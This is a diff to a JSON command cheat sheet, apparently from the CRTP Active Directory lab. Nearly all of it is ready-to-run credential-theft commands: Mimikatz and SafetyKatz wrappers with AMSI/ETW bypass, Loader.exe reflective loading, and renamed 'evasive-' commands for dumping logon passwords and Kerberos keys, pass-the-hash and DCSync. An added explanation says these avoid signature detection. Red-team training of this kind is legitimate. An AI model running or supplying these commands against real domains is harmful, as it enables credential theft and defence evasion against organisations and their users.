@@ -70,7 +70,7 @@
       "command": "Invoke-MimiEx   # lab-provided PS wrapper: runs Mimikatz with AMSI/ETW bypass baked in"
     },
     {
-      "label": "Lab evasive cred wrapper \u2014 modify then run",
+      "label": "Lab evasive cred wrapper — modify then run",
       "command": ". C:\\AD\\Tools\\Invoke-TheKatEx-keys-stdX.ps1   # Invoke-TheKat.ps1 with the function call inlined; -vault variant for DPAPI"
     }
   ],
@@ -107,5 +107,6 @@
       "label": "Evasive logonpasswords dump",
       "command": "Loader.exe -path SafetyKatz.exe -args \"sekurlsa::evasive-logonpasswords\" \"exit\""
     }
-  ]
+  ],
+  "explain": "Runs CRTP's customized SafetyKatz/Mimikatz whose commands are renamed 'evasive-' to dodge signatures, loaded in-memory via Loader.exe:\n  Loader.exe               unhook ETW/AMSI and reflectively load the assembly in-process\n  -path <safetykatz_exe>   the SafetyKatz binary to run\n  -args \"sekurlsa::evasive-keys\" \"exit\"   dump Kerberos encryption keys, then quit\nSwap the arg for evasive-logonpasswords, evasive-ekeys, evasive-pth, lsadump::evasive-dcsync, etc. Nothing signature-matchable ever hits disk or LSASS via a known-bad name."
 }
